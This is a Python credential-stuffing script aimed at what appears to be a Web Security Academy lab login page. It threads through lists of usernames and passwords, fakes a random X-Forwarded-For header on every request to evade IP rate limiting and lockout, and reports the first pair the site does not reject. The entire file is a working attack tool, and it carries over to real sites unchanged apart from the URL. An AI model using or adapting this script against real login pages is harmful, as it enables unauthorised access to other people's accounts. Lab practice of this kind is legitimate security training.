import random,string,requests,re,urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Event

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
URL="https://0aab00560415ce5a8000b788000d005f.web-security-academy.net/login"
PROXY={"https":"http://192.168.20.186:8080"}
stop=Event()

def ok(txt): return re.search(r"Invalid\susername", txt) is None

def attempt(u,p):
    if stop.is_set(): return None
    h={"Content-Type":"application/x-www-form-urlencoded","X-Forwarded-For":''.join(random.choices(string.ascii_letters+string.digits,k=8))}
    s=requests.Session()
    r=s.post(URL,data=f"username={u}&password={p}&Login=Login",headers=h,proxies=PROXY,verify=False,timeout=10)
    if ok(r.text): stop.set(); return u,p
    return None

users=[u.strip() for u in open("usernames.txt")]
pwds=[p.strip() for p in open("passwords.txt")]

with ThreadPoolExecutor(max_workers=10) as ex:
    futures=[ex.submit(attempt,u,p) for u in users for p in pwds]
    for f in as_completed(futures):
        res=f.result()
        if res: print("FOUND:",res[0],res[1]); break
print("done")
